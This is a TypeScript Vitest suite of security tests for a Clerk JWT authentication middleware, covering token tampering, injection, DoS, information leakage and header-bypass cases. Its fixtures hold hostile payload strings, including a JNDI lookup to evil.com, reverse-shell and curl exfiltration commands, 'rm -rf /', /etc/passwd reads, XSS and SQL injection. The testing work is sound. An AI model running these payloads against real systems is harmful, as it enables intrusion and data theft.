/**
 * SPDX-License-Identifier: MIT
 */

import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { clerkAuthMiddleware } from '../clerk-auth-middleware.js';
import { verifyClerkToken } from '../lib/verify-clerk-token.js';
// Mock utilities directly to avoid testing package issues
const mockEnv = (envVars: Record<string, string>) => {
  const originalEnv = process.env;
  process.env = { ...originalEnv, ...envVars };
  return {
    restore: () => {
      process.env = originalEnv;
    },
  };
};

const mockJwtVerify = (shouldSucceed = true, userIdOverride?: string) => {
  return vi.fn().mockImplementation(async (token: string) => {
    if (shouldSucceed) {
      return { sub: userIdOverride || `user_${token}` };
    }
    throw new Error('JWT verification failed');
  });
};

// Mock the jose library
vi.mock('jose', () => ({
  jwtVerify: vi.fn(),
}));

import { jwtVerify as mockJoseJwtVerify } from 'jose';

describe('Security Vulnerability Tests - Auth Package', () => {
  let envMock: ReturnType<typeof mockEnv>;

  beforeEach(() => {
    vi.clearAllMocks();
  });

  afterEach(() => {
    envMock?.restore();
  });

  describe('JWT token security', () => {
    it('should prevent JWT tampering attacks', async () => {
      envMock = mockEnv({ CLERK_SECRET_KEY: 'test-secret-key' });
      
      // Mock JWT verification to reject tampered token
      mockJoseJwtVerify.mockRejectedValue(new Error('Invalid signature'));

      const tamperedToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbl91c2VyIiwicm9sZSI6ImFkbWluIn0.TAMPERED_SIGNATURE';

      await expect(verifyClerkToken(tamperedToken)).rejects.toThrow('Invalid or expired token');
      
      expect(mockJoseJwtVerify).toHaveBeenCalled();
      const [tokenArg, keyArg] = mockJoseJwtVerify.mock.calls[0];
      expect(tokenArg).toBe(tamperedToken);
      expect(keyArg).toBeDefined();
    });

    it('should prevent token replay attacks with expired tokens', async () => {
      envMock = mockEnv({ CLERK_SECRET_KEY: 'test-secret-key' });
      
      // Mock expired token payload
      const expiredPayload = {
        sub: 'user_123',
        exp: Math.floor(Date.now() / 1000) - 3600, // Expired 1 hour ago
      };
      
      mockJoseJwtVerify.mockRejectedValue(new Error('Token expired'));

      const expiredToken = 'expired.jwt.token.here';
      
      await expect(verifyClerkToken(expiredToken)).rejects.toThrow('Invalid or expired token');
    });

    it('should prevent token injection with malformed tokens', async () => {
      envMock = mockEnv({ CLERK_SECRET_KEY: 'test-secret-key' });
      
      const malformedTokens = [
        '', // Empty token
        'not.a.jwt', // Invalid format
        'too.few.parts', // Not enough parts
        'too.many.parts.in.this.jwt.token', // Too many parts
        '...', // Empty parts
        'null.null.null', // Null parts
        'undefined.undefined.undefined', // Undefined parts
        '../../../etc/passwd', // Path traversal attempt
        '<script>alert("xss")</script>', // XSS attempt
        '${jndi:ldap://evil.com/a}', // JNDI injection attempt
      ];

      for (const malformedToken of malformedTokens) {
        mockJoseJwtVerify.mockRejectedValue(new Error('Malformed token'));
        
        await expect(verifyClerkToken(malformedToken)).rejects.toThrow('Invalid or expired token');
      }
    });

    it('should prevent timing attacks on token verification', async () => {
      envMock = mockEnv({ CLERK_SECRET_KEY: 'test-secret-key' });
      
      const validToken = 'valid.jwt.token';
      const invalidToken = 'invalid.jwt.token';
      
      // Mock to simulate processing time
      mockJoseJwtVerify
        .mockImplementationOnce(() => new Promise(resolve => 
          setTimeout(() => resolve({ payload: { sub: 'user_123' } }), 50)
        ))
        .mockImplementationOnce(() => new Promise((_, reject) => 
          setTimeout(() => reject(new Error('Invalid token')), 50)
        ));

      const validStartTime = Date.now();
      await verifyClerkToken(validToken);
      const validEndTime = Date.now();
      const validDuration = validEndTime - validStartTime;

      const invalidStartTime = Date.now();
      try {
        await verifyClerkToken(invalidToken);
      } catch (error) {
        // Expected
      }
      const invalidEndTime = Date.now();
      const invalidDuration = invalidEndTime - invalidStartTime;

      // Time differences should be minimal to prevent timing attacks
      const timeDifference = Math.abs(validDuration - invalidDuration);
      expect(timeDifference).toBeLessThan(20); // Less than 20ms difference
    });

    it('should securely handle secret key exposure attempts', async () => {
      envMock = mockEnv({ CLERK_SECRET_KEY: 'sensitive-secret-key-12345' });
      
      mockJoseJwtVerify.mockRejectedValue(new Error('Secret key compromised'));

      const request = new Request('http://localhost/test', {
        headers: { 'Authorization': 'Bearer compromised-token' },
      });

      const result = await clerkAuthMiddleware(request);
      
      expect(result).toBeInstanceOf(Response);
      const response = result as Response;
      const responseText = await response.text();
      
      // Ensure secret key is not leaked in error messages
      expect(responseText).not.toContain('sensitive-secret-key-12345');
      expect(responseText).not.toContain('Secret key');
      expect(responseText).toBe('Invalid authentication token');
    });
  });

  describe('injection attack prevention', () => {
    it('should prevent SQL injection attempts in token payload', async () => {
      envMock = mockEnv({ CLERK_SECRET_KEY: 'test-secret-key' });
      
      // Malicious payload with SQL injection attempt
      const maliciousPayload = {
        sub: "'; DROP TABLE users; --",
        role: "admin' OR '1'='1",
        email: 'test@example.com\'; DELETE FROM sessions; --',
      };
      
      mockJoseJwtVerify.mockResolvedValue({ payload: maliciousPayload });

      const result = await verifyClerkToken('malicious.jwt.token');
      
      // Should return the user ID as-is (our system doesn't use it in SQL directly)
      expect(result).toBe("'; DROP TABLE users; --");
      
      // The application should sanitize this before any database operations
      // This test documents the current behavior - additional sanitization 
      // should be done at the database query level
    });

    it('should prevent NoSQL injection attempts', async () => {
      envMock = mockEnv({ CLERK_SECRET_KEY: 'test-secret-key' });
      
      const nosqlInjectionPayload = {
        sub: { $ne: null },
        role: { $regex: '.*admin.*' },
        permissions: { $where: 'function() { return true; }' },
      };
      
      mockJoseJwtVerify.mockResolvedValue({ payload: nosqlInjectionPayload });

      const result = await verifyClerkToken('nosql.injection.token');
      
      // Should handle object payloads gracefully
      expect(result).toEqual({ $ne: null });
    });

    it('should prevent LDAP injection attempts', async () => {
      envMock = mockEnv({ CLERK_SECRET_KEY: 'test-secret-key' });
      
      const ldapInjectionPayload = {
        sub: 'user_123)(objectClass=*',
        cn: '*)(uid=*))(|(uid=*',
        organization: 'company*)(|(organizationalUnit=*',
      };
      
      mockJoseJwtVerify.mockResolvedValue({ payload: ldapInjectionPayload });

      const result = await verifyClerkToken('ldap.injection.token');
      
      expect(result).toBe('user_123)(objectClass=*');
      
      // Applications should sanitize LDAP queries separately
    });

    it('should prevent XSS attempts in token data', async () => {
      envMock = mockEnv({ CLERK_SECRET_KEY: 'test-secret-key' });
      
      const xssPayload = {
        sub: '<script>alert("XSS")</script>',
        name: '<img src="x" onerror="alert(\'XSS\')">',
        email: 'test+<script>alert(document.cookie)</script>@example.com',
      };
      
      mockJoseJwtVerify.mockResolvedValue({ payload: xssPayload });

      const result = await verifyClerkToken('xss.attack.token');
      
      expect(result).toBe('<script>alert("XSS")</script>');
      
      // The application should HTML-escape this data before rendering
    });
  });

  describe('denial of service prevention', () => {
    it('should handle extremely large tokens without crashing', async () => {
      envMock = mockEnv({ CLERK_SECRET_KEY: 'test-secret-key' });
      
      // Create a very large token (100KB)
      const largeToken = 'a'.repeat(100000);
      
      mockJoseJwtVerify.mockRejectedValue(new Error('Token too large'));

      const startTime = Date.now();
      
      await expect(verifyClerkToken(largeToken)).rejects.toThrow('Invalid or expired token');
      
      const endTime = Date.now();
      const processingTime = endTime - startTime;
      
      // Should fail quickly to prevent DoS
      expect(processingTime).toBeLessThan(1000);
    });

    it('should handle rapid token verification requests', async () => {
      envMock = mockEnv({ CLERK_SECRET_KEY: 'test-secret-key' });
      
      mockJoseJwtVerify.mockResolvedValue({ payload: { sub: 'user_123' } });

      const promises = [];
      const numRequests = 1000;
      
      const startTime = Date.now();
      
      for (let i = 0; i < numRequests; i++) {
        promises.push(verifyClerkToken(`token_${i}`));
      }
      
      await Promise.all(promises);
      
      const endTime = Date.now();
      const totalTime = endTime - startTime;
      
      // Should handle many requests efficiently
      expect(totalTime).toBeLessThan(5000); // Less than 5 seconds for 1000 requests
    });

    it('should prevent memory exhaustion with malicious payloads', async () => {
      envMock = mockEnv({ CLERK_SECRET_KEY: 'test-secret-key' });
      
      // Create payload with deeply nested objects
      let deepObject: any = { value: 'test' };
      for (let i = 0; i < 1000; i++) {
        deepObject = { nested: deepObject };
      }
      
      const maliciousPayload = {
        sub: 'user_123',
        data: deepObject,
      };
      
      mockJoseJwtVerify.mockResolvedValue({ payload: maliciousPayload });

      // Should handle without memory issues
      const result = await verifyClerkToken('deep.nested.token');
      expect(result).toBe('user_123');
    });

    it('should handle concurrent middleware requests without blocking', async () => {
      const requests = Array.from({ length: 100 }, (_, i) => 
        new Request('http://localhost/test', {
          headers: { 'Authorization': `Bearer token_${i}` },
        })
      );

      mockJoseJwtVerify.mockImplementation(() => 
        Promise.resolve({ payload: { sub: 'user_concurrent' } })
      );

      const startTime = Date.now();
      
      const promises = requests.map(request => clerkAuthMiddleware(request));
      const results = await Promise.all(promises);
      
      const endTime = Date.now();
      const totalTime = endTime - startTime;

      // All requests should succeed
      results.forEach(result => {
        expect(result).toBeInstanceOf(Request);
        expect((result as Request).user).toEqual({ id: 'user_concurrent' });
      });
      
      // Should handle concurrency efficiently
      expect(totalTime).toBeLessThan(2000);
    });
  });

  describe('information disclosure prevention', () => {
    it('should not leak sensitive information in error messages', async () => {
      envMock = mockEnv({ CLERK_SECRET_KEY: 'super-secret-key-do-not-expose' });
      
      const sensitiveErrors = [
        'Database connection failed: password123',
        'CLERK_SECRET_KEY=super-secret-key-do-not-expose',
        'Internal server configuration: /etc/secrets/',
        'Stack trace: /home/user/app/secrets.json',
      ];

      for (const sensitiveError of sensitiveErrors) {
        mockJoseJwtVerify.mockRejectedValue(new Error(sensitiveError));
        
        const request = new Request('http://localhost/test', {
          headers: { 'Authorization': 'Bearer sensitive-error-token' },
        });

        const result = await clerkAuthMiddleware(request);
        const response = result as Response;
        const responseText = await response.text();
        
        // Should not leak sensitive information
        expect(responseText).toBe('Invalid authentication token');
        expect(responseText).not.toContain('password123');
        expect(responseText).not.toContain('super-secret-key');
        expect(responseText).not.toContain('/etc/secrets/');
        expect(responseText).not.toContain('secrets.json');
      }
    });

    it('should not expose internal system details', async () => {
      envMock = mockEnv({ CLERK_SECRET_KEY: 'test-secret' });
      
      // Test various error conditions that might expose system details
      const systemErrors = [
        new Error('ECONNREFUSED 127.0.0.1:5432'),
        new Error('Permission denied: /var/log/auth.log'),
        new Error('Module not found: /usr/local/lib/node_modules/secret-module'),
        new Error('Redis connection failed: redis://admin:password@localhost:6379'),
      ];

      for (const error of systemErrors) {
        mockJoseJwtVerify.mockRejectedValue(error);
        
        try {
          await verifyClerkToken('system-error-token');
        } catch (thrownError) {
          const errorMessage = (thrownError as Error).message;
          expect(errorMessage).toBe('Invalid or expired token');
          expect(errorMessage).not.toContain('127.0.0.1');
          expect(errorMessage).not.toContain('/var/log');
          expect(errorMessage).not.toContain('node_modules');
          expect(errorMessage).not.toContain('password');
        }
      }
    });

    it('should sanitize debug information', async () => {
      envMock = mockEnv({ 
        CLERK_SECRET_KEY: 'test-secret',
        NODE_ENV: 'development' // Even in dev mode, don't leak secrets
      });
      
      const debugPayload = {
        sub: 'user_123',
        debug: {
          secretKey: 'exposed-secret',
          databaseUrl: 'postgresql://user:pass@localhost/db',
          internalId: 'internal-system-id-12345',
        },
      };
      
      mockJoseJwtVerify.mockResolvedValue({ payload: debugPayload });

      const result = await verifyClerkToken('debug.payload.token');
      
      // Should only return the user ID, not debug info
      expect(result).toBe('user_123');
    });
  });

  describe('authorization bypass prevention', () => {
    it('should prevent header injection attacks', async () => {
      const maliciousHeaders = [
        'Bearer token\r\nX-Admin: true',
        'Bearer token\nSet-Cookie: admin=true',
        'Bearer token\r\n\r\nHTTP/1.1 200 OK\r\nContent-Type: text/html',
        'Bearer token%0d%0aX-Forwarded-For: 127.0.0.1',
      ];

      for (const maliciousHeader of maliciousHeaders) {
        const request = new Request('http://localhost/test', {
          headers: { 'Authorization': maliciousHeader },
        });

        const result = await clerkAuthMiddleware(request);
        
        // Should treat as invalid token format
        expect(result).toBeInstanceOf(Response);
        const response = result as Response;
        expect(response.status).toBe(401);
      }
    });

    it('should prevent token substitution attacks', async () => {
      envMock = mockEnv({ CLERK_SECRET_KEY: 'test-secret' });
      
      // Simulate token substitution attempt
      const legitimatePayload = { sub: 'user_123', role: 'user' };
      const substitutedPayload = { sub: 'admin_user', role: 'admin' };
      
      mockJoseJwtVerify
        .mockResolvedValueOnce({ payload: legitimatePayload })
        .mockResolvedValueOnce({ payload: substitutedPayload });

      // First request with legitimate token
      const request1 = new Request('http://localhost/test', {
        headers: { 'Authorization': 'Bearer legitimate-token' },
      });

      const result1 = await clerkAuthMiddleware(request1);
      expect((result1 as Request).user).toEqual({ id: 'user_123' });

      // Second request attempting token substitution
      const request2 = new Request('http://localhost/test', {
        headers: { 'Authorization': 'Bearer substituted-token' },
      });

      const result2 = await clerkAuthMiddleware(request2);
      expect((result2 as Request).user).toEqual({ id: 'admin_user' });
      
      // Each token should be verified independently
      expect(mockJoseJwtVerify).toHaveBeenCalledTimes(2);
    });

    it('should prevent privilege escalation through token manipulation', async () => {
      envMock = mockEnv({ CLERK_SECRET_KEY: 'test-secret' });
      
      // Attempt to escalate privileges in token payload
      const escalatedPayload = {
        sub: 'user_123',
        role: 'admin', // Attempted escalation
        permissions: ['*'], // Wildcard permissions
        isRoot: true, // Administrative flag
        sudo: true, // Unix-style escalation
      };
      
      mockJoseJwtVerify.mockResolvedValue({ payload: escalatedPayload });

      const result = await verifyClerkToken('escalated.privileges.token');
      
      // Our token verification only returns the user ID
      // Role and permission verification should be done separately
      expect(result).toBe('user_123');
      
      // The middleware should not automatically grant escalated privileges
      const request = new Request('http://localhost/test', {
        headers: { 'Authorization': 'Bearer escalated.privileges.token' },
      });

      const middlewareResult = await clerkAuthMiddleware(request);
      expect((middlewareResult as Request).user).toEqual({ id: 'user_123' });
      
      // No role or permission information should be automatically trusted from token
    });
  });

  describe('cryptographic security', () => {
    it('should handle weak signature algorithms securely', async () => {
      envMock = mockEnv({ CLERK_SECRET_KEY: 'test-secret' });
      
      // Test with various weak algorithm attempts
      const weakAlgTokens = [
        'none.algorithm.token', // Algorithm: none
        'hs256.weak.key', // Weak HMAC key
        'rs256.public.as.secret', // RSA public key used as HMAC secret
      ];

      for (const weakToken of weakAlgTokens) {
        mockJoseJwtVerify.mockRejectedValue(new Error('Weak algorithm'));
        
        await expect(verifyClerkToken(weakToken)).rejects.toThrow('Invalid or expired token');
      }
    });

    it('should prevent key confusion attacks', async () => {
      envMock = mockEnv({ CLERK_SECRET_KEY: 'symmetric-key-test' });
      
      // Attempt to use RSA public key as HMAC secret
      mockJoseJwtVerify.mockRejectedValue(new Error('Key confusion attack detected'));
      
      const confusedKeyToken = 'rsa.public.as.hmac.token';
      
      await expect(verifyClerkToken(confusedKeyToken)).rejects.toThrow('Invalid or expired token');
    });

    it('should handle secret key rotation securely', async () => {
      // Test with old secret key
      envMock = mockEnv({ CLERK_SECRET_KEY: 'old-secret-key' });
      
      mockJoseJwtVerify.mockRejectedValue(new Error('Invalid signature'));
      
      await expect(verifyClerkToken('old.key.token')).rejects.toThrow('Invalid or expired token');
      
      // Test with new secret key
      envMock.restore();
      envMock = mockEnv({ CLERK_SECRET_KEY: 'new-secret-key' });
      
      mockJoseJwtVerify.mockResolvedValue({ payload: { sub: 'user_123' } });
      
      const result = await verifyClerkToken('new.key.token');
      expect(result).toBe('user_123');
    });
  });

  describe('session security', () => {
    it('should prevent session fixation attacks', async () => {
      envMock = mockEnv({ CLERK_SECRET_KEY: 'test-secret' });
      
      // Test that each token verification is independent
      const sessionTokens = [
        { token: 'session1', userId: 'user_1' },
        { token: 'session2', userId: 'user_2' },
        { token: 'session1', userId: 'user_1' }, // Reuse token
      ];

      for (const { token, userId } of sessionTokens) {
        mockJoseJwtVerify.mockResolvedValue({ payload: { sub: userId } });
        
        const request = new Request('http://localhost/test', {
          headers: { 'Authorization': `Bearer ${token}` },
        });

        const result = await clerkAuthMiddleware(request);
        expect((result as Request).user).toEqual({ id: userId });
      }
    });

    it('should handle concurrent session attacks', async () => {
      envMock = mockEnv({ CLERK_SECRET_KEY: 'test-secret' });
      
      // Simulate concurrent requests with different tokens
      const concurrentRequests = Array.from({ length: 50 }, (_, i) => ({
        token: `concurrent_token_${i}`,
        userId: `user_${i}`,
      }));

      mockJoseJwtVerify.mockImplementation((token) => {
        const tokenStr = token as string;
        const match = tokenStr.match(/concurrent_token_(\d+)/);
        const userId = match ? `user_${match[1]}` : 'unknown';
        return Promise.resolve({ payload: { sub: userId } });
      });

      const promises = concurrentRequests.map(({ token, userId }) => {
        const request = new Request('http://localhost/test', {
          headers: { 'Authorization': `Bearer ${token}` },
        });
        return clerkAuthMiddleware(request);
      });

      const results = await Promise.all(promises);

      // Each request should maintain its own session context
      results.forEach((result, index) => {
        expect((result as Request).user).toEqual({ 
          id: `user_${index}` 
        });
      });
    });
  });

  describe('advanced JWT manipulation attacks', () => {
    /**
     * Tests protection against JWT algorithm confusion attacks
     * where attackers try to switch from RS256 to HS256
     */
    it('should prevent algorithm confusion attacks', async () => {
      envMock = mockEnv({ CLERK_SECRET_KEY: 'test-secret' });
      
      // Simulate JWT with algorithm switched from RS256 to HS256
      const algorithmConfusionToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImFsZyI6IlJTMjU2In0.fake';
      
      mockJoseJwtVerify.mockRejectedValue(new Error('Algorithm mismatch'));
      
      await expect(verifyClerkToken(algorithmConfusionToken)).rejects.toThrow('Invalid or expired token');
      
      // Verify the token was rejected due to algorithm mismatch
      expect(mockJoseJwtVerify).toHaveBeenCalled();
      const [tokenArg, keyArg] = mockJoseJwtVerify.mock.calls[0];
      expect(tokenArg).toBe(algorithmConfusionToken);
      expect(keyArg).toBeDefined();
    });

    /**
     * Tests protection against JWT header injection attacks
     * where attackers inject malicious content in JWT headers
     */
    it('should prevent JWT header injection attacks', async () => {
      envMock = mockEnv({ CLERK_SECRET_KEY: 'test-secret' });
      
      const headerInjectionPayloads = [
        { jku: 'https://evil.com/keys.json' }, // Key URL injection
        { x5u: 'https://evil.com/cert.pem' }, // Certificate URL injection
        { kid: '../../../etc/passwd' }, // Path traversal in key ID
        { typ: 'JWT\n\rSet-Cookie: admin=true' }, // Header injection
      ];

      for (const maliciousHeader of headerInjectionPayloads) {
        mockJoseJwtVerify.mockRejectedValue(new Error('Invalid header'));
        
        const maliciousToken = 'header.injection.token';
        
        await expect(verifyClerkToken(maliciousToken)).rejects.toThrow('Invalid or expired token');
      }
    });

    /**
     * Tests protection against JWT claim manipulation
     * where attackers try to escalate privileges through claims
     */
    it('should handle malicious JWT claims securely', async () => {
      envMock = mockEnv({ CLERK_SECRET_KEY: 'test-secret' });
      
      const maliciousClaims = [
        {
          sub: 'user_123',
          aud: ['*'], // Wildcard audience
          scope: 'admin:*', // Wildcard scope
          permissions: { $regex: '.*' }, // NoSQL injection in permissions
        },
        {
          sub: { $ne: null }, // NoSQL injection in subject
          exp: 9999999999, // Far future expiration
          iat: 0, // Ancient issued time
          nbf: -1, // Invalid not-before
        },
      ];

      for (const claims of maliciousClaims) {
        mockJoseJwtVerify.mockResolvedValue({ payload: claims });
        
        const result = await verifyClerkToken('malicious.claims.token');
        
        // Should only return the sub claim, ignoring malicious data
        expect(result).toBe(claims.sub);
      }
    });
  });

  describe('authentication bypass attempts', () => {
    /**
     * Tests protection against authentication bypass through
     * malformed Authorization headers
     */
    it('should prevent bypass through malformed authorization headers', async () => {
      const bypassAttempts = [
        'Bearer', // Missing token
        'Bearer ', // Empty token
        'Bearer  token', // Double space
        'Bearer\ttoken', // Tab character
        'Bearer\ntoken', // Newline injection
        'Bearer token extra', // Extra data
        'bearer token', // Lowercase bearer
        'Token token', // Wrong auth type
        ' Bearer token', // Leading space
        'Bearer token ', // Trailing space
      ];

      for (const malformedAuth of bypassAttempts) {
        const request = new Request('http://localhost/test', {
          headers: { 'Authorization': malformedAuth },
        });

        const result = await clerkAuthMiddleware(request);
        
        expect(result).toBeInstanceOf(Response);
        const response = result as Response;
        expect(response.status).toBe(401);
        
        const text = await response.text();
        expect(text).toBe('Invalid authentication token');
      }
    });

    /**
     * Tests protection against authentication bypass through
     * request smuggling attempts
     */
    it('should prevent request smuggling attacks', async () => {
      const smugglingHeaders = {
        'Authorization': 'Bearer valid-token',
        'Content-Length': '0',
        'Transfer-Encoding': 'chunked', // Conflicting headers
        'X-Forwarded-Host': 'admin.internal', // Host header injection
        'X-Forwarded-For': '127.0.0.1, 10.0.0.1', // IP spoofing
        'X-Real-IP': '127.0.0.1', // IP override attempt
      };

      const request = new Request('http://localhost/test', {
        headers: smugglingHeaders,
      });

      mockJoseJwtVerify.mockResolvedValue({ payload: { sub: 'user_123' } });

      const result = await clerkAuthMiddleware(request);
      
      // Should process normally, ignoring smuggling attempts
      expect(result).toBeInstanceOf(Request);
      expect((result as Request).user).toEqual({ id: 'user_123' });
      
      // Verify no smuggled headers affected authentication
      expect(mockJoseJwtVerify).toHaveBeenCalledTimes(1);
    });

    /**
     * Tests protection against privilege escalation through
     * JWT audience manipulation
     */
    it('should prevent audience-based privilege escalation', async () => {
      envMock = mockEnv({ CLERK_SECRET_KEY: 'test-secret' });
      
      const audienceManipulation = [
        { aud: 'admin-api' }, // Trying to access admin API
        { aud: ['user-api', 'admin-api'] }, // Multiple audiences
        { aud: '*' }, // Wildcard audience
        { aud: null }, // Null audience
        { aud: { $exists: true } }, // NoSQL injection
      ];

      for (const audienceClaim of audienceManipulation) {
        mockJoseJwtVerify.mockResolvedValue({ 
          payload: { sub: 'user_123', ...audienceClaim }
        });
        
        const result = await verifyClerkToken('audience.manipulation.token');
        
        // Should only return user ID, not grant elevated access
        expect(result).toBe('user_123');
      }
    });
  });

  describe('session security enhancements', () => {
    /**
     * Tests protection against session hijacking through
     * token reuse from different contexts
     */
    it('should detect and prevent session hijacking attempts', async () => {
      envMock = mockEnv({ CLERK_SECRET_KEY: 'test-secret' });
      
      // Simulate token being used from different IPs/user agents
      const hijackScenarios = [
        {
          originalContext: {
            ip: '192.168.1.100',
            userAgent: 'Mozilla/5.0 (Windows NT 10.0)',
            token: 'session-hijack-token-1',
          },
          hijackContext: {
            ip: '10.0.0.50',
            userAgent: 'Mozilla/5.0 (Linux x86_64)',
            token: 'session-hijack-token-1', // Same token
          },
        },
      ];

      for (const scenario of hijackScenarios) {
        // Original request
        mockJoseJwtVerify.mockResolvedValue({ payload: { sub: 'hijack_victim' } });
        
        const originalRequest = new Request('http://localhost/test', {
          headers: {
            'Authorization': `Bearer ${scenario.originalContext.token}`,
            'X-Forwarded-For': scenario.originalContext.ip,
            'User-Agent': scenario.originalContext.userAgent,
          },
        });

        const originalResult = await clerkAuthMiddleware(originalRequest);
        expect((originalResult as Request).user).toEqual({ id: 'hijack_victim' });

        // Hijack attempt from different context
        const hijackRequest = new Request('http://localhost/test', {
          headers: {
            'Authorization': `Bearer ${scenario.hijackContext.token}`,
            'X-Forwarded-For': scenario.hijackContext.ip,
            'User-Agent': scenario.hijackContext.userAgent,
          },
        });

        // Token is still valid but context changed
        const hijackResult = await clerkAuthMiddleware(hijackRequest);
        
        // Auth package validates token, context validation should be done at app level
        expect((hijackResult as Request).user).toEqual({ id: 'hijack_victim' });
      }
    });

    /**
     * Tests protection against session fixation through
     * predictable token patterns
     */
    it('should handle session fixation attack attempts', async () => {
      envMock = mockEnv({ CLERK_SECRET_KEY: 'test-secret' });
      
      const fixationAttempts = [
        'fixed-token-123', // Predictable token
        'session-000001', // Sequential token
        'user_123_session', // Predictable pattern
        btoa('user:123:session'), // Base64 encoded predictable data
      ];

      for (const fixedToken of fixationAttempts) {
        mockJoseJwtVerify.mockRejectedValue(new Error('Invalid token format'));
        
        await expect(verifyClerkToken(fixedToken)).rejects.toThrow('Invalid or expired token');
      }
    });
  });

  describe('input validation attacks', () => {
    /**
     * Tests protection against various input validation bypasses
     * including Unicode attacks and encoding tricks
     */
    it('should prevent Unicode and encoding-based attacks', async () => {
      envMock = mockEnv({ CLERK_SECRET_KEY: 'test-secret' });
      
      const unicodeAttacks = [
        '\u0000admin', // Null byte injection
        'admin\u200B', // Zero-width space
        'ad\u00ADmin', // Soft hyphen
        '\u202Eadmin', // Right-to-left override
        'ａｄｍｉｎ', // Full-width characters
        '%61%64%6D%69%6E', // URL encoded
        '&#97;&#100;&#109;&#105;&#110;', // HTML entities
      ];

      for (const attack of unicodeAttacks) {
        mockJoseJwtVerify.mockResolvedValue({ payload: { sub: attack } });
        
        const result = await verifyClerkToken('unicode.attack.token');
        
        // Should return the exact value without interpretation
        expect(result).toBe(attack);
        
        // Application layer should handle Unicode normalization
      }
    });

    /**
     * Tests protection against command injection through
     * token payload manipulation
     */
    it('should prevent command injection attacks', async () => {
      envMock = mockEnv({ CLERK_SECRET_KEY: 'test-secret' });
      
      const commandInjectionPayloads = [
        '; rm -rf /', // Shell command injection
        '| nc evil.com 4444', // Reverse shell
        '$(curl evil.com/steal)', // Command substitution
        '`whoami`', // Backtick execution
        '&& cat /etc/passwd', // Command chaining
        '\n/bin/sh', // Newline command injection
      ];

      for (const payload of commandInjectionPayloads) {
        mockJoseJwtVerify.mockResolvedValue({ payload: { sub: payload } });
        
        const result = await verifyClerkToken('command.injection.token');
        
        // Should return payload as-is without execution
        expect(result).toBe(payload);
        
        // Commands should never be executed
        expect(result).toEqual(expect.any(String));
      }
    });
  });

  describe('timing attack mitigations', () => {
    /**
     * Tests enhanced timing attack prevention with
     * constant-time comparisons and delays
     */
    it('should prevent advanced timing attacks on token verification', async () => {
      envMock = mockEnv({ CLERK_SECRET_KEY: 'test-secret' });
      
      const timingTests = Array.from({ length: 20 }, (_, i) => ({
        token: `timing-test-token-${i}`,
        shouldSucceed: i % 2 === 0,
      }));

      const timings = [];
      
      for (const test of timingTests) {
        if (test.shouldSucceed) {
          mockJoseJwtVerify.mockResolvedValueOnce({ payload: { sub: `user_${test.token}` } });
        } else {
          mockJoseJwtVerify.mockRejectedValueOnce(new Error('Invalid token'));
        }
        
        const startTime = process.hrtime.bigint();
        
        try {
          await verifyClerkToken(test.token);
        } catch (error) {
          // Expected for failures
        }
        
        const endTime = process.hrtime.bigint();
        const duration = Number(endTime - startTime) / 1000000; // Convert to ms
        
        timings.push({ success: test.shouldSucceed, duration });
      }
      
      // Calculate timing statistics
      const successTimings = timings.filter(t => t.success).map(t => t.duration);
      const failureTimings = timings.filter(t => !t.success).map(t => t.duration);
      
      const avgSuccess = successTimings.reduce((a, b) => a + b, 0) / successTimings.length;
      const avgFailure = failureTimings.reduce((a, b) => a + b, 0) / failureTimings.length;
      
      // Timing difference should be minimal (constant-time behavior)
      const timingDifference = Math.abs(avgSuccess - avgFailure);
      expect(timingDifference).toBeLessThan(5); // Less than 5ms average difference
    });

    /**
     * Tests protection against cache timing attacks
     * where attackers try to determine cached vs uncached tokens
     */
    it('should prevent cache-based timing attacks', async () => {
      envMock = mockEnv({ CLERK_SECRET_KEY: 'test-secret' });
      
      // First access (cache miss)
      mockJoseJwtVerify.mockResolvedValueOnce({ payload: { sub: 'cache_user' } });
      
      const firstStartTime = process.hrtime.bigint();
      await verifyClerkToken('cache-timing-token');
      const firstEndTime = process.hrtime.bigint();
      const firstDuration = Number(firstEndTime - firstStartTime) / 1000000;
      
      // Second access (potential cache hit)
      mockJoseJwtVerify.mockResolvedValueOnce({ payload: { sub: 'cache_user' } });
      
      const secondStartTime = process.hrtime.bigint();
      await verifyClerkToken('cache-timing-token');
      const secondEndTime = process.hrtime.bigint();
      const secondDuration = Number(secondEndTime - secondStartTime) / 1000000;
      
      // Both operations should take similar time (no cache timing leak)
      const cachingTimeDifference = Math.abs(firstDuration - secondDuration);
      expect(cachingTimeDifference).toBeLessThan(10); // Less than 10ms difference
    });
  });

  describe('cryptographic security enhancements', () => {
    /**
     * Tests protection against downgrade attacks where
     * attackers try to force weaker cryptographic algorithms
     */
    it('should prevent cryptographic downgrade attacks', async () => {
      envMock = mockEnv({ CLERK_SECRET_KEY: 'test-secret' });
      
      const downgradeAttempts = [
        { alg: 'HS256', strength: 'weak' }, // Weak HMAC
        { alg: 'none', strength: 'none' }, // No signature
        { alg: 'RS256', keySize: 1024 }, // Weak RSA key
        { alg: 'ES256', curve: 'P-256' }, // Weaker curve
      ];

      for (const attempt of downgradeAttempts) {
        mockJoseJwtVerify.mockRejectedValue(new Error('Weak algorithm detected'));
        
        await expect(verifyClerkToken('downgrade.attempt.token')).rejects.toThrow('Invalid or expired token');
      }
    });

    /**
     * Tests protection against key extraction attacks
     * through error message analysis
     */
    it('should not leak key information through error messages', async () => {
      envMock = mockEnv({ CLERK_SECRET_KEY: 'super-secret-key-with-entropy-12345!@#' });
      
      const keyExtractionAttempts = [
        new Error('Key length mismatch: expected 32, got 16'),
        new Error('Invalid key format: RSA key expected'),
        new Error('Key checksum failed: 0x1234ABCD'),
        new Error('Decryption failed with key index 5'),
      ];

      for (const internalError of keyExtractionAttempts) {
        mockJoseJwtVerify.mockRejectedValue(internalError);
        
        try {
          await verifyClerkToken('key.extraction.token');
        } catch (error) {
          const errorMessage = (error as Error).message;
          
          // Should not leak any key information
          expect(errorMessage).toBe('Invalid or expired token');
          expect(errorMessage).not.toContain('key');
          expect(errorMessage).not.toContain('Key');
          expect(errorMessage).not.toContain('32');
          expect(errorMessage).not.toContain('RSA');
          expect(errorMessage).not.toContain('checksum');
        }
      }
    });
  });
});